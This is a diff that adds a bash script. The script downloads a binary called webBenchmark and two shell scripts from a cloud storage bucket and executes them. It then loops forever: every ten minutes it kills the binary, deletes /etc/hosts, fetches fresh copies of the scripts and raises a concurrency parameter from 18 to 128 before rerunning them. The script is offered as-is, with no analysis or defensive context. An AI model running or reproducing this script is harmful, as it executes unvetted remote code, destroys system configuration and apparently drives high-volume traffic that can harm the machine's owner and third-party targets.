@@ -1,0 +1,31 @@
+#!/bin/bash
+yum install psmisc -y
+sleep 5s
+apt-get install psmisc -y
+sleep 5s
+curl -O http://storage.googleapis.com/zongcai/webBenchmark_linux_x64
+chmod +x webBenchmark_linux_x64
+sleep 2s
+curl -O http://storage.googleapis.com/zongcai/jh.sh
+curl -O http://storage.googleapis.com/zongcai/hosts
+chmod +x jh.sh
+chmod +x hosts
+sh jh.sh
+sh hosts
+while true
+do
+sleep 600s
+killall -9 webBenchmark_linux_x64
+sleep 3s
+rm -rf jh.sh
+rm -rf hosts
+rm -rf /etc/hosts
+sleep 5s
+curl -O http://storage.googleapis.com/zongcai/jh.sh
+curl -O http://storage.googleapis.com/zongcai/hosts
+sed -i 's/-c 18/-c 128/' ./jh.sh
+chmod +x jh.sh
+chmod +x hosts
+sh jh.sh
+sh hosts
+done
